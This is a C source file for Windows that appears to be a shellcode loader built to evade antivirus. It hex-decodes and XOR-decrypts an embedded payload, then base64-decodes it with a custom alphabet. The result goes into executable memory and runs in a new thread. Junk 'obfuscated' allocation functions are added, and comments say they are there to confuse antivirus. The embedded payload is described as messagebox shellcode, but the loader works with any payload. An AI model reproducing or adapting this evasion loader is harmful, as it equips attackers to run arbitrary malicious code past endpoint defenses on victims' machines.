#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

const char* base64_chars = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0987654321+/";
int is_base64(unsigned char c) {
    return (strchr(base64_chars, c) != NULL);
}
int base64_decode(const char* input, unsigned char* output) {
    int len = strlen(input);
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];
    int output_len = 0;
    while (len-- && (input[i] != '=') && is_base64(input[i])) {
        char_array_4[j++] = input[i]; i++;
        if (j == 4) {
            for (j = 0; j < 4; j++) {
                char_array_4[j] = (unsigned char)(strchr(base64_chars, char_array_4[j]) - base64_chars);
            }
            char_array_3[0] = (char_array_4[0] << 2) | (char_array_4[1] >> 4);
            char_array_3[1] = ((char_array_4[1] & 15) << 4) | (char_array_4[2] >> 2);
            char_array_3[2] = ((char_array_4[2] & 3) << 6) | char_array_4[3];

            for (j = 0; j < 3; j++) {
                output[output_len++] = char_array_3[j];
            }
            j = 0;
        }
    }
    return output_len;
}

int hex_decode(const char* hex, unsigned char* output) {
    int len = strlen(hex);
    if (len % 2 != 0) return 0; // Invalid hex length
    for (int i = 0; i < len; i += 2) {
        sscanf(hex + i, "%2hhx", &output[i / 2]);
    }
    return len / 2;
}


// 3 Fake functions to initialize memory and stuff, maybe could confuse the av idk
void init_memory(void* ptr, size_t size) {
    unsigned char* p = (unsigned char*)ptr;
    for (size_t i = 0; i < size; i++) {
        p[i] = 0; } }
// Obfuscated malloc function with no-op variable
void *malloc_obfuscated(size_t size) {
    void *ptr = malloc(size);
    int no_op_var = 42; // Irrelevant var
    no_op_var++;
    if (ptr) {
        init_memory(ptr, size); }
    return ptr; }
// Obfuscated function with redundant check
void free_obfuscated(void *ptr) {
    if (ptr) {
        unsigned char* p = (unsigned char*)ptr;
        size_t len = 100;
        for (size_t i = 0; i < len; i++) {
            p[i] = p[i]; }
        free(ptr); } }


// The shellcode here is the encrytped messagebox shellcode from the previous code
void ProcessHollowing() {
    const char* encrypted_hex = "92dcccd392e9e0da9bfdf9e2c2c7d2c9c8eee2e5d2edf2e5dddec8e5ddd9c8e5e3ded8e5dfd8f2e5e7dbd9e1fef9e9cbeee0f9e38581ffded892cedafbf8cdffe1f8cdecfaf9def39ec6cdfafef8cdd0f8f0f9c39ccbe3fbd8cbe2e5f0dc9cc985cbf9f085fac8fccef9e0f9ced298e7f0d2dfc39bfdcd98fbf2d9939ce8cdd0fbf0f9c3ebc6c2e4e29ccdd0f9f0f9c3d8cee2e5f0dcd8fbe3f2e0d2e8d2e6c8f2f2c7ecd8dceefbcec4d8e6edde99c2ecccd8df85858585d8ececfccc9d99e89cc7e6f9f9f2e3e29ef89985858581fbe3e0d9c6d3fecedee0eedecbe4d89fdad0f9efcbebe9f8ce929cd9d2fbf0c0fb9fc5d385efe0e2fbcec5f299c0fafbe7cff8d2d2fbffe5c6e98585858592d9c2d392c9e8e4ddccf8e9f2e0fdd8dce7c6dcfee3e8f8fdf9fbd8fccedaf0c6c7d9e4ddfbc0e0ffe7e3eccf85e0e4d2f3e08593ecf8";
    
  int hex_len = strlen(encrypted_hex) / 2;
    unsigned char* decoded_hex = (unsigned char*)malloc_obfuscated(hex_len);
    if (!decoded_hex) {
        printf("Memory allocation failed.\n");
        return;
    }
    int decoded_len = hex_decode(encrypted_hex, decoded_hex);
    if (decoded_len == 0) {
        printf("Hexadecimal decoding failed.\n");
        free_obfuscated(decoded_hex);
        return;
    }

    xor_decrypt(decoded_hex, decoded_len, 0xAA); // Remember to use the same key

    unsigned char* base64_decoded = (unsigned char*)malloc_obfuscated(decoded_len);
    if (!base64_decoded) {
        printf("Memory allocation failed.\n");
        free_obfuscated(decoded_hex);
        return;
    }
    int shellcode_len = base64_decode((char*)decoded_hex, base64_decoded);
    if (shellcode_len == 0) {
        printf("Base64 decoding failed.\n");
        free_obfuscated(decoded_hex);
        free_obfuscated(base64_decoded);
        return;
    }
    LPVOID allocated_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        free_obfuscated(decoded_hex);
        free_obfuscated(base64_decoded);
        return;
    }
    memcpy(allocated_mem, base64_decoded, shellcode_len);
    DWORD oldProtect;
    if (!VirtualProtect(allocated_mem, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection: %d\n", GetLastError());
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        free_obfuscated(decoded_hex);
        free_obfuscated(base64_decoded);
        return;
    }
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread: %d\n", GetLastError());
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        free_obfuscated(decoded_hex);
        free_obfuscated(base64_decoded);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    free_obfuscated(decoded_hex);
    free_obfuscated(base64_decoded);
    printf("Success\n");
}

int main() {
    ProcessHollowing();
    return 0;
}
